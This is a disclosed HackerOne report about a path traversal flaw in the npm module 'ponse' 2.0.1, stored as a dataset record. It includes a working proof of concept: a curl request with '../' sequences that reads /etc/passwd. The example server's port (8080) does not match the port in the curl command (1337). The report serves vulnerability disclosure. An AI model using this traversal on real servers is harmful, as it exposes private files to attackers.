---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '383112'
original_report_id: '383112'
title: '[ponse] Path traversal in ponse module allows to read any file on server'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2018-07-18T13:28:14.211Z'
disclosed_at: '2018-07-20T08:58:03.065Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: ponse
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [ponse] Path traversal in ponse module allows to read any file on server

## Metadata

- HackerOne Report ID: 383112
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2018-07-20T08:58:03.065Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report path traversal in ponse.
It allows reading local files on the target server.

# Module

**module name:** ponse
**version:** 2.0.1
**npm page:** `https://www.npmjs.com/package/ponse`

## Module Description

Module for work with requests and responses

## Module Stats

[317] downloads in the last week
[1633] downloads in the last month

# Vulnerability

## Vulnerability Description

Path traversal vulnerability in ponse module allows to go up in directory tree and read content of any file, like /etc/passwd.

Vulnerability exists in the getStatic function, because ponse uses user submitted variable without any protection against path traversal attacks.

## Steps To Reproduce:

 - install module
`npm i --save ponse`
 
 - create index.js. for example:
```javascript
var ponse = require('ponse')
var http = require('http')
http.createServer(
    ponse.static(__dirname)
).listen(8080)
```

 - start server
`node index.js`

 - use curl to acces any file on the target server outside the given directory(__dirname). For example:
```
$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
...
```

## Supporting Material/References:

- linux 4.17.5-1-ARCH
- v10.6.0
- 6.2.0
- curl 7.61.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Malicious user can read any file on the target server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
